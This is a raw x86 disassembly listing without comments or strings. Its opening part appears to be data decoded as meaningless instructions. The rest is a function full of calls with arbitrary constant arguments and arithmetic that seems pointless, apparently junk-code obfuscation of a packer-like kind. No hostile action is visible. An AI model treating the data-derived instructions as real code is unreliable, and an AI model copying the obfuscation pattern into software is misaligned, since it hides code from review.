  4054f6:	or     BYTE PTR [esi+0x22],ch
  4054f9:	and    BYTE PTR [eax],al
  4054fb:	and    BYTE PTR [esp+eax*2],dl
  4054fe:	xor    eax,DWORD PTR [ecx]
  405500:	push   es
  405501:	add    edx,edx
  405503:	add    al,0x9c
  405505:	adc    BYTE PTR [eax+esi*1+0x21],al
  405509:	add    BYTE PTR [eax+0x1200000],dl
  40550f:	adc    BYTE PTR [eax+eax*4],dh
  405512:	dec    esp
  405513:	add    dl,BYTE PTR [eax]
  405515:	push   eax
  405516:	add    BYTE PTR [ecx-0x40],0x23
  40551a:	add    BYTE PTR [eax],al
  40551c:	pusha  
  40551d:	add    BYTE PTR [ecx],al
  40551f:	add    BYTE PTR [ecx+0x70402488],bl
  405525:	add    BYTE PTR [eax],cl
  405527:	dec    eax
  405528:	add    BYTE PTR [eax],0x2
  40552b:	and    ecx,0x80805
  405531:	inc    eax
  405532:	or     BYTE PTR [ecx+eax*1],0x0
  405536:	add    cl,cl
  405538:	add    BYTE PTR [ecx],dl
  40553a:	add    BYTE PTR [edx],cl
  40553c:	add    DWORD PTR [eax],ecx
  40553e:	sbb    BYTE PTR [eax+edx*4],al
  405541:	add    BYTE PTR [edx],cl
  405543:	or     BYTE PTR [eax],al
  405545:	popa   
  405546:	add    BYTE PTR [esi+0xf],bh
  405549:	inc    eax
  40554a:	add    BYTE PTR [ecx+0x24082400],ah
  405550:	inc    eax
  405551:	add    al,0x10
  405553:	add    DWORD PTR [eax+0x4a],eax
  405556:	test   BYTE PTR [ecx+0x56204040],dl
  40555c:	and    bh,ah
  40555e:	adc    DWORD PTR [eax+eax*1+0x0],esp
  405562:	adc    al,0x44
  405564:	add    ecx,DWORD PTR [eax]
  405566:	adc    DWORD PTR [ecx-0x3fef73bf],eax
  40556c:	pusha  
  40556d:	and    BYTE PTR [eax],ah
  40556f:	add    BYTE PTR [edi],al
  405571:	sbb    BYTE PTR [esi+0x31],0x52
  405575:	inc    eax
  405576:	pop    edx
  405577:	add    eax,0x4a002055
  40557c:	mov    eax,ds:0x230401
  405581:	add    al,0x88
  405583:	leave  
  405584:	and    bl,BYTE PTR [ecx+0x20]
  405587:	add    DWORD PTR [eax],0x64184140
  40558d:	add    BYTE PTR [eax+0x9f2801a],al
  405593:	push   es
  405594:	add    al,0x48
  405596:	add    DWORD PTR [eax],0xe
  405599:	dec    edx
  40559a:	xor    DWORD PTR [eax-0x80],edx
  40559d:	pop    edx
  40559e:	or     BYTE PTR [eax],0x4
  4055a1:	inc    eax
  4055a2:	add    al,BYTE PTR [eax]
  4055a4:	add    BYTE PTR [edx],dl
  4055a6:	add    BYTE PTR [edx],al
  4055a8:	add    BYTE PTR [eax],al
  4055aa:	adc    BYTE PTR [eax+edi*1],al
  4055ad:	or     BYTE PTR [esi+0x48400220],cl
  4055b3:	add    DWORD PTR [edx],eax
  4055b5:	add    BYTE PTR [ebx],al
  4055b7:	inc    eax
  4055b8:	inc    ebx
  4055b9:	add    dl,ah
  4055bb:	mov    edx,0x16000000
  4055c0:	pusha  
  4055c1:	and    BYTE PTR [eax],al
  4055c3:	add    BYTE PTR [eax],al
  4055c5:	add    BYTE PTR [eax],ah
  4055c7:	add    ah,BYTE PTR [eax]
  4055c9:	inc    eax
  4055ca:	adc    DWORD PTR [eax],eax
  4055cc:	adc    BYTE PTR [eax],dl
  4055ce:	add    BYTE PTR [eax+0x10],al
  4055d1:	test   BYTE PTR [eax],al
  4055d3:	add    BYTE PTR [eax],al
  4055d5:	or     BYTE PTR [esi],al
  4055d7:	and    BYTE PTR [ecx],dh
  4055d9:	xor    DWORD PTR [eax],eax
  4055db:	and    DWORD PTR [eax-0x79f7afe8],edx
  4055e1:	xor    al,0x0
  4055e3:	add    BYTE PTR [eax-0x7ffebb56],al
  4055e9:	add    BYTE PTR [eax],al
  4055eb:	dec    ebx
  4055ec:	inc    eax
  4055ed:	add    BYTE PTR [ecx],al
  4055ef:	add    BYTE PTR [ebp+0x20198000],al
  4055f5:	or     BYTE PTR [eax+0x4],0x8
  4055f9:	xchg   esp,eax
  4055fa:	or     BYTE PTR [eax],al
  4055fc:	add    DWORD PTR [edi],eax
  4055fe:	sbb    BYTE PTR [edi],al
  405600:	add    BYTE PTR [eax+eiz*2],0x0
  405604:	xchg   edx,eax
  405605:	add    BYTE PTR [edx+edx*4],0x16
  405609:	add    DWORD PTR [eax+0x2404000],eax
  40560f:	add    BYTE PTR [eax+0x42],dl
  405612:	add    al,0x8
  405614:	add    DWORD PTR [ecx],0x220000c0
  40561a:	or     al,0x77
  40561c:	xor    BYTE PTR [edx],al
  40561e:	add    BYTE PTR [eax+eax*4],dh
  405621:	add    DWORD PTR [eax],ebx
  405623:	adc    BYTE PTR [ecx-0x7eeffff0],ah
  405629:	adc    BYTE PTR [ecx],dl
  40562b:	rcl    BYTE PTR [ecx],0x20
  40562e:	inc    edx
  40562f:	pusha  
  405630:	sbb    DWORD PTR [eax],eax
  405632:	add    BYTE PTR [eax],al
  405634:	add    al,0x10
  405636:	adc    BYTE PTR [eax+0x4010106],0x0
  40563d:	test   BYTE PTR [eax],al
  40563f:	push   eax
  405640:	inc    eax
  405641:	add    BYTE PTR [edx],ah
  405643:	add    BYTE PTR [eax],0x0
  405646:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405647:	adc    DWORD PTR [ebx],eax
  405649:	add    BYTE PTR [eax],al
  40564b:	inc    ecx
  40564c:	cmp    ah,BYTE PTR [eax+ecx*2]
  40564f:	sub    ah,BYTE PTR [eax+0x20]
  405652:	sbb    al,0x10
  405654:	sub    eax,DWORD PTR [eax]
  405656:	or     BYTE PTR [eax],al
  405658:	add    BYTE PTR [ecx+0x48],al
  40565b:	adc    al,BYTE PTR ss:[eax]
  40565e:	push   eax
  40565f:	sbb    eax,esp
  405661:	inc    eax
  405662:	adc    BYTE PTR [eax],al
  405664:	add    BYTE PTR [eax],al
  405666:	add    BYTE PTR [esp+0x20],al
  40566a:	adc    BYTE PTR [eax],cl
  40566c:	or     BYTE PTR [eax+0x40],ah
  40566f:	add    BYTE PTR [eax],al
  405671:	les    eax,FWORD PTR [eax]
  405673:	dec    eax
  405674:	and    BYTE PTR [eax],al
  405676:	add    BYTE PTR [ebx+eax*1+0x40702047],0x40
  40567e:	add    BYTE PTR [eax+0x2100000a],dl
  405684:	add    BYTE PTR [eax],al
  405686:	adc    DWORD PTR [ecx],edx
  405688:	inc    ecx
  405689:	add    dl,dh
  40568b:	inc    esi
  40568c:	add    al,BYTE PTR [eax+eax*1]
  40568f:	inc    eax
  405690:	add    BYTE PTR [edx+0x8810],al
  405696:	adc    BYTE PTR [eax+0x61150860],cl
  40569c:	add    al,bl
  40569e:	push   eax
  40569f:	and    al,0x3
  4056a1:	or     BYTE PTR [ecx],0x8
  4056a4:	add    BYTE PTR [edx+0x40],bl
  4056a7:	inc    eax
  4056a8:	or     al,0x2
  4056aa:	xor    BYTE PTR [eax],ah
  4056ac:	xor    DWORD PTR [eax+eax*4],eax
  4056af:	and    DWORD PTR [eax],edx
  4056b1:	test   BYTE PTR [eax],al
  4056b3:	add    BYTE PTR [edx+0x2c45000],al
  4056b9:	inc    eax
  4056ba:	and    al,BYTE PTR [ecx]
  4056bc:	and    al,0x80
  4056be:	add    al,0x2
  4056c0:	or     BYTE PTR [eax],dl
  4056c2:	add    BYTE PTR [eax+0x3024026],al
  4056c8:	or     BYTE PTR [edx+0x30000100],dl
  4056ce:	push   es
  4056cf:	inc    ecx
  4056d0:	add    BYTE PTR [eax],dl
  4056d2:	adc    BYTE PTR [eax+eiz*1],al
  4056d5:	add    eax,DWORD PTR [ecx]
  4056d7:	add    BYTE PTR [eax+0x0],al
  4056da:	add    ch,BYTE PTR [eax]
  4056dc:	mov    eax,ds:0xa95000
  4056e1:	add    ebp,DWORD PTR [eax+0x0]
  4056e4:	and    al,0x4
  4056e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056e7:	add    DWORD PTR [ecx],eax
  4056e9:	add    BYTE PTR [eax+0x2],al
  4056ec:	inc    ecx
  4056ed:	and    al,BYTE PTR fs:[eax]
  4056f0:	inc    eax
  4056f1:	add    DWORD PTR [eax],eax
  4056f3:	add    BYTE PTR [eax],al
  4056f5:	mov    BYTE PTR [eax+eax*1+0x44],ch
  4056f9:	inc    edx
  4056fa:	add    al,0x80
  4056fc:	or     BYTE PTR [edx],dl
  4056fe:	cwde   
  4056ff:	add    BYTE PTR [eax],al
  405701:	and    BYTE PTR [eax],al
  405703:	mov    DWORD PTR [eax],eax
  405705:	adc    DWORD PTR [eax],eax
  405707:	add    BYTE PTR [edx],0x0
  40570a:	add    BYTE PTR [eax],0x30
  40570d:	and    BYTE PTR [eax+0x0],al
  405710:	add    ah,ah
  405712:	add    BYTE PTR [ecx],cl
  405714:	add    al,BYTE PTR [eax]
  405716:	push   eax
  405717:	adc    BYTE PTR [eax],al
  405719:	add    BYTE PTR [eax],al
  40571b:	adc    DWORD PTR fs:[edx],eax
  40571e:	add    BYTE PTR [eax],ah
  405720:	pop    es
  405721:	add    BYTE PTR [ecx],bh
  405723:	xor    cl,BYTE PTR [eax+0x4d]
  405726:	stos   BYTE PTR es:[edi],al
  405727:	or     BYTE PTR [eax],dl
  405729:	add    al,0x62
  40572b:	and    al,al
  40572d:	inc    ebx
  40572e:	adc    BYTE PTR [ebx],al
  405730:	push   ebp
  405731:	mov    ebp,esp
  405733:	sub    esp,0x64
  405736:	call   0x408817
  40573b:	push   ebx
  40573c:	call   0x408aa5
  405741:	push   esi
  405742:	push   0x72
  405744:	push   0xffffffd1
  405746:	push   0x8f2fe500
  40574b:	push   0xfffffff1
  40574d:	push   0xffffffe0
  40574f:	call   0x408aa5
  405754:	add    esp,0x14
  405757:	push   edi
  405758:	cmp    eax,DWORD PTR [ebp-0x50]
  40575b:	je     0x405767
  40575d:	xor    eax,eax
  40575f:	mov    esi,eax
  405761:	mov    DWORD PTR [ebp-0x64],eax
  405764:	mov    DWORD PTR [ebp-0x40],esi
  405767:	push   0x77d43600
  40576c:	call   0x408589
  405771:	add    esp,0x4
  405774:	push   0xc51f3900
  405779:	push   0xffffffbe
  40577b:	push   0x5ff07200
  405780:	call   0x408c13
  405785:	add    esp,0xc
  405788:	push   0x30
  40578a:	push   0x8fa03d00
  40578f:	push   0xf749c200
  405794:	call   0x40807c
  405799:	add    esp,0xc
  40579c:	push   0x20
  40579e:	push   0x32
  4057a0:	push   0x26
  4057a2:	push   0xffffffb7
  4057a4:	push   0x4f23c800
  4057a9:	call   0x408aa5
  4057ae:	add    esp,0x14
  4057b1:	call   0x408c13
  4057b6:	push   0x855f8600
  4057bb:	push   0xe39b6e00
  4057c0:	push   0x8f2ea800
  4057c5:	push   0xffffff81
  4057c7:	call   0x408c13
  4057cc:	add    esp,0x10
  4057cf:	mov    DWORD PTR [ebp-0x3c],eax
  4057d2:	mov    edx,DWORD PTR ds:0x44a3ac
  4057d8:	push   0x49
  4057da:	push   0x2388e600
  4057df:	push   0xffffff91
  4057e1:	call   0x408817
  4057e6:	add    esp,0xc
  4057e9:	call   0x4086d1
  4057ee:	push   0x8
  4057f0:	call   0x408aa5
  4057f5:	add    esp,0x4
  4057f8:	call   0x408589
  4057fd:	push   0xffffffb9
  4057ff:	push   0xffffffae
  405801:	push   0x57018300
  405806:	call   0x4086d1
  40580b:	add    esp,0xc
  40580e:	call   0x408aa5
  405813:	push   0xfffffff3
  405815:	push   0x57370d00
  40581a:	push   0xffffff8f
  40581c:	call   0x408aa5
  405821:	add    esp,0xc
  405824:	push   0xfbfbe500
  405829:	push   0x6b
  40582b:	push   0x17
  40582d:	call   0x408589
  405832:	add    esp,0xc
  405835:	mov    eax,DWORD PTR [ebp-0x3c]
  405838:	test   eax,0x59
  40583d:	jne    0x40585b
  40583f:	push   0x7d5cf00
  405844:	push   0x4f341700
  405849:	push   0x77488600
  40584e:	push   0x97d44800
  405853:	call   0x408589
  405858:	add    esp,0x10
  40585b:	push   0xd7debc00
  405860:	call   0x408c13
  405865:	add    esp,0x4
  405868:	push   0x4f1b3900
  40586d:	push   0xc395e100
  405872:	push   0xffffffb7
  405874:	push   0x6bfc4c00
  405879:	call   0x408aa5
  40587e:	add    esp,0x10
  405881:	push   0xffffffa8
  405883:	push   0x75
  405885:	push   0x956f3d00
  40588a:	call   0x408589
  40588f:	add    esp,0xc
  405892:	add    DWORD PTR [ebp-0x3c],esi
  405895:	push   0xffffffb0
  405897:	push   0x772a6800
  40589c:	call   0x408589
  4058a1:	add    esp,0x8
  4058a4:	push   0xffffffcf
  4058a6:	push   0x4d
  4058a8:	call   0x408da2
  4058ad:	add    esp,0x8
  4058b0:	push   0xbbada800
  4058b5:	push   0xe572bd00
  4058ba:	push   0x4f253a00
  4058bf:	call   0x408250
  4058c4:	add    esp,0xc
  4058c7:	push   0x5710d900
  4058cc:	push   0x8392f200
  4058d1:	call   0x408250
  4058d6:	add    esp,0x8
  4058d9:	call   0x408da2
  4058de:	push   0x4570e900
  4058e3:	push   0xe39d4a00
  4058e8:	push   0xffffffbd
  4058ea:	push   0xffffffac
  4058ec:	push   0xbf824100
  4058f1:	call   0x4086d1
  4058f6:	add    esp,0x14
  4058f9:	cmp    eax,DWORD PTR ds:0x44a3ac
  4058ff:	jne    0x405910
  405901:	push   0x3b
  405903:	push   0xbbfa9c00
  405908:	call   0x408250
  40590d:	add    esp,0x8
  405910:	mov    edx,0xc5
  405915:	mov    eax,0x2f24
  40591a:	push   0x777b4800
  40591f:	push   0xffffff8a
  405921:	push   0xf754c800
  405926:	call   0x408da2
  40592b:	add    esp,0xc
  40592e:	push   0x17e8cf00
  405933:	push   0xfb6e500
  405938:	push   0x33e76d00
  40593d:	push   0xffffffcb
  40593f:	push   0xffffffe5
  405941:	call   0x408e8e
  405946:	add    esp,0x14
  405949:	mov    edi,DWORD PTR [ebp-0x3c]
  40594c:	push   0xa52f2c00
  405951:	push   0x8bc9d400
  405956:	push   0x7fc35900
  40595b:	call   0x408250
  405960:	add    esp,0xc
  405963:	push   0x4f
  405965:	push   0x7fee1600
  40596a:	push   0xc53e0300
  40596f:	call   0x408da2
  405974:	add    esp,0xc
  405977:	mov    esi,DWORD PTR ds:0x44a3bc
  40597d:	add    DWORD PTR [ebp-0x3c],edi
  405980:	push   0xfffffff8
  405982:	call   0x408817
  405987:	add    esp,0x4
  40598a:	push   0x6c
  40598c:	push   0x12
  40598e:	push   0x60
  405990:	call   0x408589
  405995:	add    esp,0xc
  405998:	push   0xffffffb6
  40599a:	push   0x17a2b300
  40599f:	push   0xcf6ef200
  4059a4:	push   0xdfc96900
  4059a9:	push   0xf553dd00
  4059ae:	call   0x40807c
  4059b3:	add    esp,0x14
  4059b6:	push   0x7fa6d400
  4059bb:	call   0x40807c
  4059c0:	add    esp,0x4
  4059c3:	push   0xfffffff1
  4059c5:	push   0x22
  4059c7:	push   0xffffffac
  4059c9:	call   0x408c13
  4059ce:	add    esp,0xc
  4059d1:	mov    DWORD PTR [ebp-0xc],eax
  4059d4:	call   0x408c13
  4059d9:	push   0x11
  4059db:	push   0xffffff99
  4059dd:	call   0x408817
  4059e2:	add    esp,0x8
  4059e5:	call   0x408aa5
  4059ea:	push   0x41
  4059ec:	call   0x4086d1
  4059f1:	add    esp,0x4
  4059f4:	sub    DWORD PTR [ebp-0x3c],esi
  4059f7:	push   0xffffffd0
  4059f9:	push   0x57548900
  4059fe:	push   0x56
  405a00:	push   0x27b24d00
  405a05:	push   0xb
  405a07:	call   0x408aa5
  405a0c:	add    esp,0x14
  405a0f:	push   0x2e
  405a11:	push   0x0
  405a13:	call   DWORD PTR ds:0x44a158
  405a19:	mov    esi,eax
  405a1b:	cmp    esi,edi
  405a1d:	jne    0x405ad9
  405a23:	mov    ebx,0x5ba8
  405a28:	mov    edx,DWORD PTR [ebp-0x3c]
  405a2b:	sub    esi,eax
  405a2d:	cmp    edx,0x17200000
  405a33:	jne    0x405ad9
  405a39:	or     edx,esi
  405a3b:	add    ebx,eax
  405a3d:	sub    DWORD PTR [ebp-0xc],eax
  405a40:	mov    edi,DWORD PTR [ebp-0x3c]
  405a43:	xor    ecx,ecx
  405a45:	add    edx,esi
  405a47:	sub    edx,ebx
  405a49:	sub    DWORD PTR [ebp-0xc],edi
  405a4c:	cmp    edx,0x15
  405a4f:	je     0x405ad9
  405a55:	mov    esi,0x2c
  405a5a:	mov    ebx,DWORD PTR [ebp-0x3c]
  405a5d:	and    edx,ecx
  405a5f:	or     edx,ebx
  405a61:	add    esi,ecx
  405a63:	add    edx,ecx
  405a65:	add    esi,eax
  405a67:	sub    edx,ebx
  405a69:	cmp    edx,DWORD PTR [ebp-0x1c]
  405a6c:	je     0x405ad9
  405a6e:	mov    ecx,DWORD PTR [ebp-0xc]
  405a71:	cmp    esi,0x36
  405a74:	jne    0x405ad9
  405a76:	mov    ebx,0xb2
  405a7b:	mov    edi,0xf6
  405a80:	or     ecx,edi
  405a82:	sub    DWORD PTR [ebp-0xc],ebx
  405a85:	cmp    esi,edi
  405a87:	je     0x405ad9
  405a89:	mov    ebx,0xcd
  405a8e:	test   ecx,0x33
  405a94:	je     0x405ad9
  405a96:	mov    edi,DWORD PTR ds:0x44a3ac
  405a9c:	add    DWORD PTR [ebp-0x3c],edi
  405a9f:	mov    edi,DWORD PTR [ebp-0x3c]
  405aa2:	and    edx,eax
  405aa4:	sub    DWORD PTR [ebp-0xc],edi
  405aa7:	or     esi,ecx
  405aa9:	sub    edx,eax
  405aab:	sub    DWORD PTR [ebp-0x3c],esi
  405aae:	sub    edx,esi
  405ab0:	add    edx,esi
  405ab2:	cmp    edx,DWORD PTR [ebp-0x4c]
  405ab5:	jne    0x405ad9
  405ab7:	xor    DWORD PTR [ebp-0x3c],ebx
  405aba:	mov    ebx,DWORD PTR [ebp-0xc]
  405abd:	cmp    ebx,DWORD PTR [ebp-0x3c]
  405ac0:	je     0x405ad9
  405ac2:	cmp    edx,0xffffffd8
  405ac5:	jne    0x405ad9
  405ac7:	or     DWORD PTR [ebp-0xc],ebx
  405aca:	add    edx,edi
  405acc:	test   edx,0x6186
  405ad2:	jne    0x405ad9
  405ad4:	add    edx,edx
  405ad6:	sub    DWORD PTR [ebp-0xc],edx
  405ad9:	cmp    eax,0x30
  405adc:	je     0x405b55
  405ade:	push   0xa7f31400
  405ae3:	push   0xffffff9e
  405ae5:	push   0x1c
  405ae7:	push   0x1507ca00
  405aec:	call   0x40807c
  405af1:	add    esp,0x10
  405af4:	mov    ebx,0xfa
  405af9:	push   0x72
  405afb:	call   0x408aa5
  405b00:	add    esp,0x4
  405b03:	push   0x953f5200
  405b08:	push   0xf3ebc600
  405b0d:	push   0xf07d600
  405b12:	push   0x38
  405b14:	call   0x4086d1
  405b19:	add    esp,0x10
  405b1c:	push   0xf735e400
  405b21:	push   0xffffff8b
  405b23:	push   0x17
  405b25:	call   0x40807c
  405b2a:	add    esp,0xc
  405b2d:	push   0x950a6800
  405b32:	push   0xffffff80
  405b34:	push   0xffffff93
  405b36:	push   0x23
  405b38:	push   0xffffff82
  405b3a:	call   0x408c13
  405b3f:	add    esp,0x14
  405b42:	mov    DWORD PTR [ebp-0x4],ebx
  405b45:	mov    eax,DWORD PTR ds:0x44a3ac
  405b4b:	push   0x59
  405b4d:	call   0x408e8e
  405b52:	add    esp,0x4
  405b55:	call   0x408250
  405b5a:	push   0x939a1500
  405b5f:	push   0xcf4b9000
  405b64:	push   0xf7abf00
  405b69:	push   0xf7492700
  405b6e:	call   0x408c13
  405b73:	add    esp,0x10
  405b76:	push   0x4ba5c100
  405b7b:	push   0xfffffff6
  405b7d:	push   0x1d
  405b7f:	call   0x408da2
  405b84:	add    esp,0xc
  405b87:	call   0x408e8e
  405b8c:	lea    eax,[ebp-0x14]
  405b8f:	push   eax
  405b90:	call   DWORD PTR ds:0x44a104
  405b96:	mov    ebx,DWORD PTR [ebp-0x3c]
  405b99:	mov    edx,DWORD PTR [ebp-0x3c]
  405b9c:	cmp    esi,DWORD PTR ds:0x44a3bc
  405ba2:	je     0x405bba
  405ba4:	mov    ecx,esi
  405ba6:	add    DWORD PTR [ebp-0x3c],ebx
  405ba9:	add    ecx,esi
  405bab:	cmp    edx,0x67
  405bae:	je     0x405bba
  405bb0:	add    DWORD PTR [ebp-0xc],edx
  405bb3:	sub    ecx,esi
  405bb5:	add    ecx,edi
  405bb7:	sub    DWORD PTR [ebp-0x3c],ecx
  405bba:	cmp    eax,0x7d
  405bbd:	jne    0x405c2f
  405bbf:	push   0xffffff9a
  405bc1:	call   0x408c13
  405bc6:	add    esp,0x4
  405bc9:	push   0x7bfc2800
  405bce:	push   0xa3fc0b00
  405bd3:	push   0xcf2b2900
  405bd8:	call   0x408817
  405bdd:	add    esp,0xc
  405be0:	mov    ecx,0xf4
  405be5:	add    ebx,esi
  405be7:	and    ebx,eax
  405be9:	add    DWORD PTR [ebp-0xc],ecx
  405bec:	mov    edx,0x62c8
  405bf1:	cmp    ebx,0xffffffb0
  405bf4:	je     0x405bfc
  405bf6:	add    DWORD PTR [ebp-0x3c],edx
  405bf9:	add    DWORD PTR [ebp-0x3c],ebx
  405bfc:	sub    eax,ecx
  405bfe:	sub    DWORD PTR [ebp-0xc],eax
  405c01:	mov    DWORD PTR [ebp-0x50],ecx
  405c04:	and    edx,ecx
  405c06:	push   0xfffffff9
  405c08:	push   0x31
  405c0a:	push   0xbb07d00
  405c0f:	push   0xb5274f00
  405c14:	push   0xffffffa8
  405c16:	call   0x4086d1
  405c1b:	add    esp,0x14
  405c1e:	push   0xffffff80
  405c20:	push   0xffffffd1
  405c22:	push   0xc55d6000
  405c27:	call   0x408e8e
  405c2c:	add    esp,0xc
  405c2f:	push   0x2799a500
  405c34:	push   0xffffffd6
  405c36:	push   0xffffffd7
  405c38:	push   0xb5003800
  405c3d:	call   0x4086d1
  405c42:	add    esp,0x10
  405c45:	or     eax,ebx
  405c47:	mov    ebx,DWORD PTR ds:0x44a3bc
  405c4d:	call   0x40807c
  405c52:	push   0xffffff87
  405c54:	push   0x41
  405c56:	push   0x4f0f9a00
  405c5b:	push   0x19
  405c5d:	call   0x408589
  405c62:	add    esp,0x10
  405c65:	mov    esi,0xf7
  405c6a:	and    DWORD PTR [ebp-0xc],edi
  405c6d:	sub    DWORD PTR [ebp-0x3c],ebx
  405c70:	push   0xe56b2c00
  405c75:	push   0xbbb70a00
  405c7a:	push   0x58
  405c7c:	push   0x32
  405c7e:	call   0x408589
  405c83:	add    esp,0x10
  405c86:	push   0x13
  405c88:	call   0x408c13
  405c8d:	add    esp,0x4
  405c90:	add    DWORD PTR [ebp-0x3c],ebx
  405c93:	push   0x54dbf00
  405c98:	push   0xffabfb00
  405c9d:	call   0x4086d1
  405ca2:	add    esp,0x8
  405ca5:	push   0x21
  405ca7:	call   0x40807c
  405cac:	add    esp,0x4
  405caf:	push   0xfbfc9400
  405cb4:	push   0xba3b900
  405cb9:	push   0x752cae00
  405cbe:	call   0x408e8e
  405cc3:	add    esp,0xc
  405cc6:	call   0x408250
  405ccb:	push   0xffffffa3
  405ccd:	call   0x408250
  405cd2:	add    esp,0x4
  405cd5:	push   0xffffffe3
  405cd7:	push   0x1c
  405cd9:	push   0x21
  405cdb:	push   0x66
  405cdd:	call   0x408250
  405ce2:	add    esp,0x10
  405ce5:	push   0x32
  405ce7:	push   0x1baa2500
  405cec:	push   0xff84e300
  405cf1:	push   0xfffffff2
  405cf3:	push   0xebb26c00
  405cf8:	call   0x408c13
  405cfd:	add    esp,0x14
  405d00:	push   0xffffffc6
  405d02:	call   0x408817
  405d07:	add    esp,0x4
  405d0a:	push   0x456b1c00
  405d0f:	push   0xd7980c00
  405d14:	push   0x24
  405d16:	push   0xf70c0800
  405d1b:	call   0x408da2
  405d20:	add    esp,0x10
  405d23:	push   0x67c4f000
  405d28:	push   0x70
  405d2a:	push   0xffffffc2
  405d2c:	push   0xffffff8b
  405d2e:	call   0x40807c
  405d33:	add    esp,0x10
  405d36:	add    DWORD PTR [ebp-0xc],esi
  405d39:	call   DWORD PTR ds:0x44a150
  405d3f:	add    DWORD PTR [ebp-0xc],esi
  405d42:	test   eax,0xc0
  405d47:	je     0x405e62
  405d4d:	push   0x6382ea00
  405d52:	call   0x408aa5
  405d57:	add    esp,0x4
  405d5a:	xor    esi,esi
  405d5c:	push   0xffffffa4
  405d5e:	push   0x1fd7f600
  405d63:	push   0x73
  405d65:	call   0x40807c
  405d6a:	add    esp,0xc
  405d6d:	mov    eax,0x6702006b
  405d72:	add    DWORD PTR [ebp-0x3c],eax
  405d75:	push   0x57897200
  405d7a:	push   0xdfe0f000
  405d7f:	call   0x408250
  405d84:	add    esp,0x8
  405d87:	mov    edx,esi
  405d89:	mov    ebx,DWORD PTR [ebp-0xc]
  405d8c:	mov    eax,DWORD PTR [ebp-0xc]
  405d8f:	add    eax,ebx
  405d91:	cmp    eax,0xffffffb8
  405d94:	je     0x405ddb
  405d96:	add    eax,ebx
  405d98:	sub    eax,esi
  405d9a:	mov    ebx,0xd9
  405d9f:	mov    ecx,DWORD PTR ds:0x44a3a8
  405da5:	add    ecx,ebx
  405da7:	cmp    eax,DWORD PTR [ebp-0x24]
  405daa:	je     0x405ddb
  405dac:	cmp    eax,0x82dd
  405db1:	je     0x405ddb
  405db3:	cmp    eax,0xffffffaa
  405db6:	je     0x405ddb
  405db8:	mov    ebx,DWORD PTR [ebp-0xc]
  405dbb:	cmp    eax,esi
  405dbd:	jne    0x405ddb
  405dbf:	add    DWORD PTR [ebp-0x3c],ebx
  405dc2:	mov    ecx,DWORD PTR [ebp-0xc]
  405dc5:	add    ecx,ecx
  405dc7:	or     eax,edx
  405dc9:	mov    ebx,0xb02e
  405dce:	mov    DWORD PTR [ebp-0xc],eax
  405dd1:	or     ecx,edx
  405dd3:	add    ecx,edx
  405dd5:	or     DWORD PTR [ebp-0x3c],ebx
  405dd8:	add    DWORD PTR [ebp-0xc],ecx
  405ddb:	sub    edi,ecx
  405ddd:	mov    ebx,0x861
  405de2:	add    ebx,esi
  405de4:	add    DWORD PTR [ebp-0x3c],ebx
  405de7:	mov    ebx,DWORD PTR [ebp-0x3c]
  405dea:	sub    DWORD PTR [ebp-0xc],edi
  405ded:	or     ebx,ecx
  405def:	and    ebx,esi
  405df1:	add    DWORD PTR [ebp-0x3c],ebx
  405df4:	mov    DWORD PTR [ebp-0x44],esi
  405df7:	mov    ecx,eax
  405df9:	mov    esi,DWORD PTR [ebp-0x3c]
  405dfc:	cmp    esi,ebx
  405dfe:	jne    0x405e18
  405e00:	mov    ebx,0x54
  405e05:	sub    ebx,eax
  405e07:	mov    edi,DWORD PTR [ebp-0xc]
  405e0a:	sub    DWORD PTR [ebp-0xc],esi
  405e0d:	sub    DWORD PTR [ebp-0xc],ecx
  405e10:	and    edi,eax
  405e12:	xor    DWORD PTR [ebp-0xc],edi
  405e15:	add    DWORD PTR [ebp-0x3c],ebx
  405e18:	xor    ecx,ecx
  405e1a:	mov    ebx,0xa3
  405e1f:	add    DWORD PTR [ebp-0x3c],ecx
  405e22:	sub    ebx,ecx
  405e24:	cmp    eax,0x2c
  405e27:	je     0x405e34
  405e29:	cmp    esi,0x280d
  405e2f:	jne    0x405e34
  405e31:	sub    DWORD PTR [ebp-0xc],ecx
  405e34:	add    ebx,edx
  405e36:	add    ebx,ecx
  405e38:	sub    ebx,edx
  405e3a:	or     ebx,edi
  405e3c:	sub    ebx,ecx
  405e3e:	add    ebx,esi
  405e40:	add    DWORD PTR [ebp-0xc],ebx
  405e43:	xor    DWORD PTR [ebp-0x44],edx
  405e46:	push   0x57cb4100
  405e4b:	call   0x408c13
  405e50:	add    esp,0x4
  405e53:	push   0xb
  405e55:	push   0x7b28d00
  405e5a:	call   0x408aa5
  405e5f:	add    esp,0x8
  405e62:	push   0x950b2800
  405e67:	push   0x3fa90a00
  405e6c:	push   0x18
  405e6e:	push   0x97de0f00
  405e73:	call   0x408817
  405e78:	add    esp,0x10
  405e7b:	sub    DWORD PTR [ebp-0xc],edi
  405e7e:	call   DWORD PTR ds:0x44a114
  405e84:	xor    ecx,ecx
  405e86:	sub    DWORD PTR [ebp-0xc],ebx
  405e89:	add    ecx,edi
  405e8b:	or     DWORD PTR [ebp-0x3c],ecx
  405e8e:	test   eax,0x87
  405e93:	je     0x406248
  405e99:	sub    ebx,edi
  405e9b:	push   0x3c
  405e9d:	push   0x31
  405e9f:	push   0xefe00d00
  405ea4:	call   0x408aa5
  405ea9:	add    esp,0xc
  405eac:	xor    DWORD PTR [ebp-0x3c],ebx
  405eaf:	push   0x70
  405eb1:	push   0x574a7900
  405eb6:	call   0x408250
  405ebb:	add    esp,0x8
  405ebe:	xor    ebx,ebx
  405ec0:	push   0x572e8c00
  405ec5:	push   0x1bf82200
  405eca:	call   0x408589
  405ecf:	add    esp,0x8
  405ed2:	push   0x4a
  405ed4:	push   0xffffffca
  405ed6:	push   0xd3855400
  405edb:	push   0x8f28bd00
  405ee0:	push   0x5394ee00
  405ee5:	call   0x408e8e
  405eea:	add    esp,0x14
  405eed:	and    eax,ebx
  405eef:	push   0xffffff88
  405ef1:	push   0xffffff96
  405ef3:	push   0x5c
  405ef5:	push   0x65679f00
  405efa:	push   0xffffffac
  405efc:	call   0x408c13
  405f01:	add    esp,0x14
  405f04:	add    ebx,ebx
  405f06:	mov    eax,0x56
  405f0b:	push   0x67f38400
  405f10:	push   0xff97ef00
  405f15:	call   0x408250
  405f1a:	add    esp,0x8
  405f1d:	push   0xb57da200
  405f22:	push   0x455c7f00
  405f27:	push   0x3ffbe00
  405f2c:	push   0x25400900
  405f31:	call   0x408aa5
  405f36:	add    esp,0x10
